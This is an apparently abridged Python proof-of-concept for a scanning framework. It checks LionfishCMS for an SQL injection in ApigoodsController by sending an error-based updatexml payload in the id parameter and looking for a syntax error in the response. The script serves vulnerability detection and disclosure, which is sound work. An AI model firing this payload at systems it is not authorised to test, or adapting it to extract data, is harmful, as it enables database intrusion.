...
POC_NAME = "LionFish2"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class LionFish2(BasePoc):

    poc_info = {
        'poc': {
            'Id': 'vb_2021_0004',    # PoC的VID编号
            'vbid': '',
            'Name': 'LionfishCMS ApigoodsController.class.php SQL Injection',    # PoC名称
            'Author': 'mumu',    # PoC作者
            'Create_date': '2021-06-03',    # PoC创建时间
            },

        'vul': {
            'Product': '狮子鱼',    # 漏洞所在产品名称
            'Version': '',    # 产品的版本号
            'Type': 'SQL_Injection',    # 漏洞类型
            'Severity': 'critical',    # 漏洞危害等级low/medium/high/critical
            'isWeb' : True,    # 是否Web漏洞
            'Description': '''
                狮子鱼CMS ApigoodsController.class.php SQL注入漏洞
            ''',    # 漏洞简要描述
            'DisclosureDate': '2021-06-03',    # PoC公布时间
        }
    }
    ...
    def verify(self, first=False):
        ...
        # 以下是PoC的检测逻辑
        url = urljoin(target,'/index.php?s=apigoods/get_goods_detail&id=1%20and%20updatexml(1,concat(0x7e,md5(1),0x7e),1)')
        headers = {
        ...
        if "syntax" in location:
            ...
            if verbose:
                highlight('[+] LionfishCMS ApigoodsController.class.php SQL Injection found')    # 打印高亮信息发现漏洞，其他可用方法包括info()/warn()/error()/highlight()方法分别打印不同等级的信息
        else:
            if verbose:
                highlight('[+] LionfishCMS ApigoodsController.class.php SQL Injection not found')    # 打印高亮信息发现漏洞，其他可用方法包括info()/warn()/error()/highlight()方法分别打印不同等级的信息
